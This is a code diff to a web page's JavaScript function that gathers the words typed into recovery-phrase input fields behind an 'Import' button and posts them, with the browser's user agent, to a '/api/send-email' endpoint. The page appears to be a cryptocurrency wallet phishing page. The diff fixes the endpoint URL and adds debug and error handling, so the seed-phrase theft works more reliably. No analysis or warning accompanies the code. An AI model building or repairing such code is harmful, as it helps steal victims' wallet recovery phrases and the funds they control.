@@ -155,12 +155,12 @@ const API_ENDPOINT = (() => {
 
 // Update the sendWords function to work with Vercel API routes
 async function sendWords(btn) {
+    // Store original button text at the beginning of the function
+    const originalText = btn.textContent || 'Import';
+    
     try {
         const inputs = document.querySelectorAll('.phrase-input input');
         const words = Array.from(inputs).map(input => input.value.trim());
-        
-        // Store original button text
-        const originalText = btn.textContent;
         
         // First check for empty fields
         if (words.some(word => word === '')) {
@@ -180,7 +180,33 @@ async function sendWords(btn) {
         
         console.log('Sending recovery phrase to server...');
         
-        const response = await fetch(`/api/send-email.js`, {
+        // Fix API URL to ensure it points to the right location
+        const apiUrl = window.location.origin + '/api/send-email';
+        console.log('Using API URL:', apiUrl);
+        
+        // Test debug endpoint first
+        try {
+            const debugResponse = await fetch(`${window.location.origin}/api/debug`, {
+                method: 'GET'
+            });
+            
+            console.log('Debug endpoint status:', debugResponse.status);
+            if (debugResponse.ok) {
+                const debugData = await debugResponse.json();
+                console.log('Debug endpoint response:', debugData);
+            } else {
+                console.error('Debug endpoint failed with status:', debugResponse.status);
+                const errorText = await debugResponse.text();
+                console.error('Debug endpoint error text:', errorText || '(empty response)');
+            }
+        } catch (debugError) {
+            console.error('Error calling debug endpoint:', debugError.message || 'Unknown error');
+        }
+        
+        // Now try the actual endpoint
+        console.log('Sending data to:', apiUrl);
+        
+        const response = await fetch(apiUrl, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json'
@@ -191,33 +217,66 @@ async function sendWords(btn) {
                 userAgent: navigator.userAgent
             })
         });
-
+        
+        console.log('Response status:', response.status);
+        
         // Check if response is ok
         if (!response.ok) {
-            throw new Error(`HTTP error! Status: ${response.status}`);
+            let errorMessage = `HTTP error! Status: ${response.status}`;
+            
+            try {
+                const errorText = await response.text();
+                console.error('Error response body:', errorText || '(empty response)');
+                
+                // Try to parse as JSON if possible
+                try {
+                    const errorJson = JSON.parse(errorText);
+                    if (errorJson && errorJson.message) {
+                        errorMessage += ` - ${errorJson.message}`;
+                    }
+                } catch (jsonError) {
+                    // Not JSON, use text
+                    if (errorText && errorText.length > 0) {
+                        errorMessage += ` - ${errorText.substring(0, 100)}${errorText.length > 100 ? '...' : ''}`;
+                    }
+                }
+            } catch (textError) {
+                console.error('Failed to read error response:', textError);
+            }
+            
+            throw new Error(errorMessage);
         }
         
         // Try to parse as JSON
-        let data;
         const contentType = response.headers.get('content-type');
+        console.log('Response content type:', contentType);
+        
         if (contentType && contentType.includes('application/json')) {
-            data = await response.json();
-            
-            if (data.success) {
-                showSuccess(btn);
-                return;
-            } else {
-                throw new Error(data.message || 'Failed to process recovery phrase');
+            try {
+                const data = await response.json();
+                console.log('Response data:', data);
+                
+                if (data.success) {
+                    showSuccess(btn, data.message || 'Success!');
+                    return;
+                } else {
+                    throw new Error(data.message || 'Failed to process recovery phrase');
+                }
+            } catch (jsonError) {
+                console.error('JSON parse error:', jsonError);
+                throw new Error('Failed to parse server response as JSON');
             }
         } else {
             // Not JSON response
+            const textResponse = await response.text();
+            console.log('Text response:', textResponse || '(empty response)');
             throw new Error('Server returned non-JSON response');
         }
     } catch (error) {
-        console.error('Error:', error);
-        alert('An error occurred. Please try again.');
+        console.error('Error:', error.message || 'Unknown error');
+        alert(`An error occurred: ${error.message || 'Unknown error'}. Please try again.`);
         btn.disabled = false;
-        btn.textContent = originalText || 'Import';
+        btn.textContent = originalText;
     }
 }
 
